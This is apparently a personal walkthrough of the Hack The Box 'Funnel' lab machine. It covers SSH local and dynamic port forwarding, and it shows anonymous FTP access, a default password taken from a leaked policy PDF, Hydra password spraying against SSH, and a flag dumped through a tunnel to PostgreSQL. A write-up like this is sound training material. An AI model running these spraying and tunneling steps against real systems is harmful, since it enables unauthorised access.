#ftp #postgre-sql #reconnaissance #tunneling #passwod-spraying #port-forwarding #anonymous-access #clear-text-credentials 

# 0. Theory

The definition of `tunneling` according to the [Wikipedia](https://en.wikipedia.org/wiki/Tunneling_protocol):

> In computer networks, a tunneling protocol is a communication protocol which allows for the movement of data from one network to another, by exploiting encapsulation. It involves allowing private network communications to be sent across a public network (such as the Internet) through a process called encapsulation.
> [...]
> The tunneling protocol works by using the data portion of a packet (the payload) to carry the packets that actually provide the service. Tunneling uses a layered protocol model such as those of the OSI or TCP/IP protocol suite, but usually violates the layering when using the payload to carry a service not normally provided by the network. Typically, the delivery protocol operates at an equal or higher level in the layered model than the payload protocol.

According to the definition of tunneling, one can use it to access resources that are available only to internal networks. To create/facilitate such tunnels, an appropriate application should be used. The most known one is `SSH` . According to [Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell):

>The Secure Shell Protocol (SSH) is a cryptographic network protocol for operating network services securely over an unsecured network. Its most notable applications are remote login and command-line execution.

The `SSH` protocol is vastly used for maintaining and accessing remote systems in a secure and encrypted way. But, it also offers the possibility to create tunnels that operate over the SSH protocol. More specifically, `SSH` offers various types of tunnels. Before we start exploring these types we have to clarify some basics on how the SSH protocol works.

First of all, the machine that initiates the connection is called the `client` and the machine that receives the connections is called the `server` . The client, has to authenticate to the server in order for the connection to succeed. After the connection is initiated, we have a valid SSH session and the client is able to interact with the server via a shell. The main thing to point out here, is that the data that gets transported through this session can be of any type. This is exactly what allows us to create SSH tunnels within an existing valid SSH session.

The first type of tunneling is called `Local port forwarding`. When local port forwarding is used, a separate tunnel is created inside the existing valid SSH session that forwards network traffic from a local port on the client's machine over to the remote server's port. Under the hood, SSH allocates a socket listener on the client on the given port. When a connection is made to this port, the connection is forwarded over the existing SSH session over to the remote server's port.

The second type of tunneling is called `Remote port forwarding`, also known as `Reverse Tunneling`, and it is exactly the opposite operation of a `Local port forwarding tunnel`. Again, after a successful SSH connection, a separate tunnel is created which SSH uses to redirect incoming traffic to the server's port back to the client. Internally, SSH allocates a socket listener on the server on the given port. When a connection is made to this port, the connection is forwarded over the existing SSH session over to the local client's port.

The third type of tunneling is called `Dynamic port forwarding`. The main issue with both local and remote forwarding is that a local and a remote port have to be defined prior to the creation of the tunnel. To address this issue, one can use `dynamic tunneling`. Dynamic tunneling, allows the users to specify just one port that will forward the incoming traffic from the client to the server dynamically. The usage of dynamic tunneling relies upon the the SOCKS5 protocol. The definition of the `SOCKS` protocol according to [Wikipedia](https://en.wikipedia.org/wiki/SOCKS) is the following:

>SOCKS is an Internet protocol that exchanges network packets between a client and server through a proxy server. SOCKS5 optionally provides authentication so only authorized users may access a server. Practically, a SOCKS server proxies TCP connections to an arbitrary IP address, and provides a means for UDP packets to be forwarded.

So, what is happening internally is that SSH turns into a `SOCKS5` proxy that proxies connections from the client through the server. Tunneling can be a tricky topic to wrap one's head around, and hands-on practice helps a lot in understanding it.


# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ ping 10.129.193.224 -c 4
	PING 10.129.193.224 (10.129.193.224) 56(84) bytes of data.
	64 bytes from 10.129.193.224: icmp_seq=1 ttl=63 time=8.45 ms
	64 bytes from 10.129.193.224: icmp_seq=2 ttl=63 time=8.28 ms
	64 bytes from 10.129.193.224: icmp_seq=3 ttl=63 time=1323 ms
	
	--- 10.129.193.224 ping statistics ---
	4 packets transmitted, 3 received, 25% packet loss, time 3012ms
	rtt min/avg/max/mdev = 8.278/446.686/1323.337/619.885 ms, pipe 2

# 2. Enumeration

Starting with an `nmap` scan to check for open ports and services running.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ nmap -sC -sV 10.129.193.224
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-15 12:34 CDT
	Nmap scan report for 10.129.193.224
	Host is up (0.010s latency).
	Not shown: 998 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.10.14.64
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 2
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
	|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
	|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds


We see that there are 2 open ports: on `port 21` a `vsftpd 3.0.3` service is running, and on `port 22` an `OpenSSH 8.2p1`.
We can also see that anonymous login is allowed for the FTP service. So we attempt a log in with the ftp user `anonymous`:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ ftp 10.129.193.224
	Connected to 10.129.193.224.
	220 (vsFTPd 3.0.3)
	Name (10.129.193.224:root): anonymous
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp>

Once connected successfully, the `help` command lists all available ftp commands in case we need some guidance.
First we sniff around with the `dir` and cd commands to navigate around and see what is there on this server.

	ftp> dir
	229 Entering Extended Passive Mode (|||8814|)
	150 Here comes the directory listing.
	drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
	226 Directory send OK.
	ftp> cd mail_backup
	250 Directory successfully changed.
	ftp> dir
	229 Entering Extended Passive Mode (|||10439|)
	150 Here comes the directory listing.
	-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
	-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
	226 Directory send OK.

Let's grab both of those files with the `get` command.

	ftp> get password_policy.pdf
	local: password_policy.pdf remote: password_policy.pdf
	229 Entering Extended Passive Mode (|||57222|)
	150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
	100% |*******************************************| 58899        2.94 MiB/s    00:00 ETA
	226 Transfer complete.
	58899 bytes received in 00:00 (2.10 MiB/s)
	ftp> get welcome_28112022
	local: welcome_28112022 remote: welcome_28112022
	229 Entering Extended Passive Mode (|||54399|)
	150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
	100% |*******************************************|   713      679.96 KiB/s    00:00 ETA
	226 Transfer complete.
	713 bytes received in 00:00 (79.19 KiB/s)

We terminate the ftp connection with the `exit` command, and check the contents of the downloaded files.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ cat welcome_28112022
	Frome: root@funnel.htb
	To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
	Subject:Welcome to the team!
	
	Hello everyone,
	We would like to welcome you to our team. 
	We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
	We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
	All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
	We hope that you will have an amazing time with us,
	The funnel team. 


The `welcome_28112022` file appears to be an email, sent to various employees of the *Funnel* company, instructing them to read the attached document, presumably the other file we downloaded, and go through the steps mentioned there to gain access to their internal infrastructure. Crucially, we can see all the emails that this message is addressed to, giving us an idea of what usernames we might encounter on the target machine.

We can open password_policy.pdf with a pdf reader.
(By typing `open .` into the terminal, the file explorer window will be opened in the directory where we are standing at, and we can just open the pdf file with a document reader.)

![[Pasted image 20240915195402.png]]

At the end of the document, we can find a **default** password: `funnel123#!#`.

# 3. Foothold

Overall, this enumeration yielded a handful of potential usernames, as well as a default password. We also know that `SSH` is running on the target machine, meaning we could attempt to brute-force a username-password combination, using the credentials we gathered. This type of attack is also referred to as *password spraying*, and can be automated using a tool such as `Hydra`.

The password spraying technique involves circumventing common countermeasures against brute-force attacks, such as the locking of the account due to too many attempts, as the same password is sprayed across many users before another password is attempted. `Hydra` is preinstalled on most penetration testing distributions, such as `ParrotOS` and `Kali Linux`, but can also be manually installed using the following command:

`sudo apt-get install hydra`

In order to conduct our attack, we need to create a list of usernames to try the password against. To do so, we can refer to the email we read earlier, extracting the usernames of all the addresses into a list called `usernames.txt` , making sure to only include the part **before** `@funnel.htb`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ cat usernames.txt 
	optimus
	albert
	andreas
	christine
	maria


And now we can task `Hydra` with executing the attack on the target machine:
- Using the `-L` option, we specify which file contains the list of usernames for the attack.
- The `-p` option specifies that we only want to use **one** password, instead of a *password list*.
- After the target IP address, we specify the protocol for the attack, which will be `SSH`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ hydra -L usernames.txt -p 'funnel123#!#' 10.129.193.224 ssh
	Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-15 13:05:59
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
	[DATA] attacking ssh://10.129.193.224:22/
	[22][ssh] host: 10.129.193.224   login: christine   password: funnel123#!#
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-15 13:06:03


Hydra gets a valid hit on the combination `christine:funnel123#!#`.
We can now use these credentials to gain remote access to the machine as the user `christine`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.64]─[scrage@htb-8dklubjats]─[~]
	└──╼ [★]$ ssh christine@10.129.193.224
	The authenticity of host '10.129.193.224 (10.129.193.224)' can't be established.
	ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.129.193.224' (ED25519) to the list of known hosts.
	christine@10.129.193.224's password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	  System information as of Sun 15 Sep 2024 06:09:13 PM UTC
	
	  System load:              0.0
	  Usage of /:               63.2% of 4.78GB
	  Memory usage:             12%
	  Swap usage:               0%
	  Processes:                159
	  Users logged in:          0
	  IPv4 address for docker0: 172.17.0.1
	  IPv4 address for ens160:  10.129.193.224
	  IPv6 address for ens160:  dead:beef::250:56ff:fe94:322
	
	 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
	   just raised the bar for easy, resilient and secure K8s cluster deployment.
	
	   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
	
	0 updates can be applied immediately.
	
	
	The list of available updates is more than a week old.
	To check for new updates run: sudo apt update
	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
	
	
	christine@funnel:~$

## Further Enumeration

From this point on, we have complete access as the `christine` user on the target machine, and can start enumerating it for potential files or services that we can explore further. A crucial command at this point in time is the `ss` command, which stands for `socket statistics`, and can be used to check which ports are listening locally on a given machine.

	-l: Display only listening sockets.
	-t: Display TCP sockets.
	-n: Do not try to resolve service names.

	ss -tln

	christine@funnel:~$ ss -tln
	State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
	LISTEN  0        4096           127.0.0.1:36431          0.0.0.0:*              
	LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
	LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
	LISTEN  0        4096           127.0.0.1:5432           0.0.0.0:*              
	LISTEN  0        32                     *:21                   *:*              
	LISTEN  0        128                 [::]:22                [::]:*              


The output reveals a couple of information:
- The first column indicates the `state` that the socket is in; since we specified the `-l` flag, we will only see sockets that are actively *listening* for a connection. 
- The `Recv-Q` column is not of much concern at this point, it simply displays the number of queued *received* packets for that given port.
- `Send-Q` does the same but for the amount of sent packets.
- The crucial column is the fourth, which displays the local address on which a service listens, as well as its port. `127.0.0.1` is synonymous with `localhost`, and essentially means that the specified port is **only** listening **locally** on the machine and cannot be accessed externally. - This also explains why we didn't discover such ports in the initial `nmap` scan.

On the other hand, the addresses `0.0.0.0` , `*`, and `[::]` indicate that a port is listening on **all** interfaces, meaning that it is accessible externally, as well as locally, which is why we were able to detect both the `FTP` service on `port 21` , as well as the `SSH` service on `port 22`.

Among these open ports, one particularly sticks out, namely port `5432`. Running `ss` again **without** the `-n` flag will show the default service that is presumably running on the respective port.

	christine@funnel:~$ ss -tl
	State   Recv-Q  Send-Q   Local Address:Port         Peer Address:Port  Process  
	LISTEN  0       4096         127.0.0.1:36431             0.0.0.0:*              
	LISTEN  0       4096     127.0.0.53%lo:domain            0.0.0.0:*              
	LISTEN  0       128            0.0.0.0:ssh               0.0.0.0:*              
	LISTEN  0       4096         127.0.0.1:postgresql        0.0.0.0:*              
	LISTEN  0       32                   *:ftp                     *:*              
	LISTEN  0       128               [::]:ssh                  [::]:*              


In this case, the default service that runs on `TCP` port `5432` is `PostgreSQL`.

`PostgreSQL` can typically be interacted with using a command-line tool called `psql` , however, attempting to run this command on the target machine shows that the tool is not installed.

One way to overcome this roadblock is to use *port-forwarding*, or *tunneling*, using `SSH`.

## Tunneling
### Local Port-Forwarding

There are multiple options to take at this point when it comes to the actual port-forwarding, but we will opt for **local** port forwarding in this case. (**Dynamic** is also a viable option.)

To use local port forwarding with `SSH`, we can use the `ssh` command with the `-L` option, followed by the local port, remote host and port, and the remote `SSH` server.
For example, the following command will forward traffic from the local port `1234` to the remote server `remote.example.com`'s localhost interface on `port 22`:

	ssh -L 1234:localhost:22 user@remote.example.com

When we run this command, the `SSH` client will establish a secure connection to the remote `SSH` server, and it will **listen** for incoming connections on the **local** port `1234`. When a client connects to the **local** port, the `SSH` client will **forward** the connection to the **remote** server on port `22`. This allows the **local** client to access services on the **remote** server as if they were running on the **local** machine.

In this current scenario, we want to forward traffic from **any** given local port, for instance `1234` , to the port on which `PostgreSQL` is listening, namely `5432`, on the remote server. We therefore specify port `1234` to the **left** of `localhost`, and `5432` to the **right**, indicating the target port.

![[Pasted image 20240917221937.png]]

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-5hpzj0tboq]─[~]
	└──╼ [★]$ ssh -L 1234:localhost:5432 christine@10.129.69.167
	christine@10.129.69.167's password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
	
	 [*** SNIP ***]

> *As a side-note, we may elect to just establish a tunnel to the target, without actually opening a full-on shell on the target system. To do so, we can use the `-f` and `-N` flags, which a) send the command to the shell's background right before executing it remotely, and b) tells `SSH` not to execute any commands remotely.*

After entering `christine`'s password, we can see that we have a shell on the target system once more, however, under its hood, `SSH` has opened up a socket on our local machine on port `1234` , to which we can now direct traffic that we want forwarded to port `5432` on the target machine. We can see this new socket by running `ss` again, but this time on our local machine, using a different shell than the one we used to establish the tunnel.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-5hpzj0tboq]─[~]
	└──╼ [★]$ ss -tlpn
	State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process                                 
	LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*                                               
	LISTEN     0          4096                 0.0.0.0:111               0.0.0.0:*                                               
	LISTEN     0          128                127.0.0.1:631               0.0.0.0:*                                               
	LISTEN     0          5                  127.0.0.1:5901              0.0.0.0:*        users:(("Xtigervnc",pid=2576,fd=9))    
	LISTEN     0          128                127.0.0.1:1234              0.0.0.0:*        users:(("ssh",pid=45728,fd=5))         
	LISTEN     0          100            94.237.25.196:80                0.0.0.0:*                                               
	LISTEN     0          128                     [::]:22                   [::]:*                                               
	LISTEN     0          4096                    [::]:111                  [::]:*                                               
	LISTEN     0          128                    [::1]:631                  [::]:*                                               
	LISTEN     0          128                    [::1]:1234                 [::]:*        users:(("ssh",pid=45728,fd=4))         
	LISTEN     0          5                      [::1]:5901                 [::]:*        users:(("Xtigervnc",pid=2576,fd=10)) 


In order to interact with the remote service, we must first install `psql` locally on our system. This can be done using the default package manager (on most pentesting distros), `apt`.

	sudo apt update && sudo apt install psql

Using our installation of `psql` , we can now interact with the `PostgreSQL` service running locally on the target machine. We make sure to specify `localhost` using the `-h` option, as we are targeting the tunnel we created earlier with `SSH` , as well as port `1234` with the `-p` option, which is the port the tunnel is listening on.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-5hpzj0tboq]─[~]
	└──╼ [★]$ psql -U christine -h localhost -p 1234
	Password for user christine: 
	psql (15.7 (Debian 15.7-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))
	Type "help" for help.
	
	christine=#

We have successfully tunneled ourselves through to the remote `PostgreSQL` service, and can now interact with the various databases and tables on the system.
In order to list the existing databases, we can execute the `\l` command, short for `\list`.

	christine=# \l
	                                                  List of databases
	   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
	-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
	 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
	 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
	 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
	 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
	           |           |          |            |            |            |                 | christine=CTc/christine
	 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
	           |           |          |            |            |            |                 | christine=CTc/christine
	(5 rows)


Using the `\c` command, short for `\connect` , we can select a database and proceed to interact with its tables.
Let's connect to the database `secrets`, then list the database's tables using the `\dt` command, and dump its contents using the conventional SQL `SELECT` query.

	secrets=# \dt
	         List of relations
	 Schema | Name | Type  |   Owner   
	--------+------+-------+-----------
	 public | flag | table | christine
	(1 row)
	
	secrets=# select * from flag;
	              value               
	----------------------------------
	 cf277664b1771217d7006acdea006db1
	(1 row)

Flag exfiltrated: `cf277664b1771217d7006acdea006db1`


### Dynamic Port-Forwarding

Instead of local port forwarding, we could have also opted for dynamic port forwarding, again using SSH . Unlike local port forwarding and remote port forwarding, which use a **specific** local and remote port (earlier we used 1234 and 5432 , for instance), dynamic port forwarding uses a **single** local port and **dynamically** assigns remote ports for each connection.

To use dynamic port forwarding with SSH, we can use the `ssh` command with the `-D` option, followed by the local port, the remote host and port, and the remote SSH server. For example, the following command will forward traffic from the local port 1234 to the remote server on port 5432, where the PostgreSQL server is running:

	ssh -D 1234 {user}@{target_IP}

>*Again, we can use the -f and -N flags so we don't actually SSH into the box, and can instead continue using that shell locally.*

This time around we specify a single local port to which we will direct all the traffic needing forwarding. If we would now try to run the same `psql` command as before, we would get an error.

That is because this time around we would've not specified a target port for our traffic to be directed to, meaning `psql` would just be sending traffic into the established local socket on port `1234`, but would never reach the `PostgreSQL` service on the target machine.

To make use of dynamic port forwarding, a tool such as `proxychains` is especially useful. In summary, `proxychains` can be used to tunnel a connection through multiple proxies; a use case for this could be increasing anonymity, as the origin of a connection would be significantly more difficult to trace. In our case, we would only tunnel through **one** such "proxy"; the target machine.

The tool is pre-installed on most pentesting distributions (such as `ParrotOS` and `Kali Linux` ) and is highly customisable, featuring an array of strategies for tunneling, which can be tampered with in its configuration file `/etc/proxychains4.conf`.

The minimal changes that we have to make to the file for proxychains to work in our current use case is to:
1. Ensure that `strict_chain` is **not** commented out; (`dynamic_chain` and `random_chain` should be commented out).
2. At the very bottom of the file, under `[ProxyList]`, we specify the `socks5` (or `socks4`) host and port that we used for our tunnel.

```
[*** SNIP ***]

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks5 127.0.0.1 1234
```

Having configured `proxychains` correctly, we could now connect to the `PostgreSQL` service on the target, as if we were on the target machine ourselves.
This is done by prefixing whatever command we want to run with `proxychains`, like so:

	proxychains psql -U christine -h localhost -p 5432

>*It's worth noting that `proxychains` is very verbose, so it produces an unusually high amount of output. This is because it's showing us whether a certain connection to a proxy worked or not.*

If we wanted to `cURL` a webserver on port `80` , for instance, during local port forwarding we would have to run the tunneling command all over again and change up the target port. Here, we can simply prefix our `cURL` command with `proxychains`, and access the webserver as if we were on the target machine ourselves; no need for any extra specification - hence, **dynamic**.